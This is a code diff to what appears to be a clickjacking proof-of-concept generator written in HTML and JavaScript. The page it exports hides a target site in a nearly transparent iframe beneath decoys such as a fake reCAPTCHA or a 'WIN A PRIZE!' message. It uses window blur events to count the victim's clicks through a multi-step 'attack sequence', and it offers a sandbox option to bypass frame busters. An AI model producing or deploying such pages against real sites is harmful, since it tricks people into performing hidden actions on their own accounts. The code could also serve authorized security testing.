@@ -203,6 +203,21 @@
         <label class="label">Decoy Text:</label>
         <input type="text" value="WIN A PRIZE!" id="decoyText" style="width: 100%">
         
+        <label class="label" style="margin-top: 15px;">
+            <p>
+
+            <input type="checkbox" id="sandboxToggle" style="margin-right: 5px;">
+            Enable iframe Sandbox (bypasses frame busters)
+            </p>
+        </label>
+        
+        <label class="label" style="margin-top: 8px;">
+            <p>
+            <input type="checkbox" id="exportOpacityToggle" style="margin-right: 5px;">
+            Export iframe at 0.5 opacity (default 0.001)
+            </p>
+        </label>
+        
         <hr>
         <label class="label">Multi-Click Sequencer:</label>
         <div style="display: flex; gap: 5px; margin-bottom: 10px;">
@@ -214,17 +229,6 @@
 
         <button onclick="exportPoC()" style="width:100%; padding: 8px; cursor:pointer;">Export Final HTML</button>
         <p id="coords" style="font-size: 10px; font-family: monospace; margin-top: 10px;"></p>
-
-        <label class="label" style="margin-top: 15px;">
-            <input type="checkbox" id="sandboxToggle" style="margin-right: 5px;">
-            Enable iframe Sandbox (bypasses frame busters)
-        </label>
-        
-        <label class="label" style="margin-top: 8px;">
-            <input type="checkbox" id="exportOpacityToggle" style="margin-right: 5px;">
-            Export iframe at 0.5 opacity (default 0.001)
-        </label>
-        
     </div>
 
     <div id="decoy_container">
@@ -498,7 +502,6 @@
             <head>
             <style>
                 body { margin: 0; overflow: hidden; height: 100vh; }
-                /* The iframe starts at the position of Step 1 */
                 #target_frame { 
                     position: absolute; 
                     top: ${steps[0].top}; left: ${steps[0].left}; 
@@ -518,13 +521,11 @@
                 <iframe id="target_frame" src="${frame.src}"${sandboxToggle.checked ? ' sandbox="allow-forms allow-scripts allow-same-origin"' : ''}></iframe>
 
                 <script>
-                    // Multi-click logic
                     const steps = ${stepsJSON};
                     let currentStep = 0;
                     const iframe = document.getElementById('target_frame');
                     const counter = document.getElementById('click_counter');
 
-                    // reCAPTCHA animation logic (only for reCAPTCHA decoy)
                     ${decoyType.value === 'recaptcha' ? `
                     const recaptchaBox = document.getElementById('recaptcha_decoy');
                     let recaptchaLoading = false;
@@ -555,16 +556,13 @@
                         }, 2000);
                     }` : ''}
 
-                    // Redirect link logic (only for redirect decoy)
                     ${decoyType.value === 'redirect' ? `
                     const redirectLink = document.querySelector('.redirect-message a');
                     function markLinkVisited() {
                         if (redirectLink) redirectLink.classList.add('visited');
                     }` : ''}
 
-                    // Listen for the window losing focus (which happens when they click the iframe)
                     window.addEventListener('blur', function() {
-                        // Trigger decoy animations on click
                         ${decoyType.value === 'recaptcha' ? 'animateRecaptcha();' : ''}
                         ${decoyType.value === 'redirect' ? 'markLinkVisited();' : ''}
                         
@@ -582,23 +580,24 @@
                                 console.log("Advanced to Step " + (currentStep + 1));
                                 counter.innerText = currentStep;
                                 
-                                // Crucial: We must reclaim focus to detect the NEXT click
                                 window.focus(); 
-                                // Note: Browsers sometimes block programmatic focus. 
-                                // A common trick is to alert() or simply hope the user clicks the "background" 
-                                // if your decoy requires it.
                             } else {
                                 console.log("Attack sequence complete");
                                 counter.innerText = "Done";
-                                // Optionally hide everything or redirect
                             }
                         }, 200);
                     });
                 <\/script>
             </body>
             </html>`;
-        console.log(finalCode);
-        alert("PoC HTML code has been logged to the Developer Console (F12)!");
+        
+        navigator.clipboard.writeText(finalCode).then(() => {
+            alert("PoC HTML copied to clipboard");
+        }).catch(err => {
+            console.error("Clipboard write failed:", err);
+            console.log(finalCode);
+            alert("PoC HTML logged to console.");
+        });
         }
     </script>
 </body>
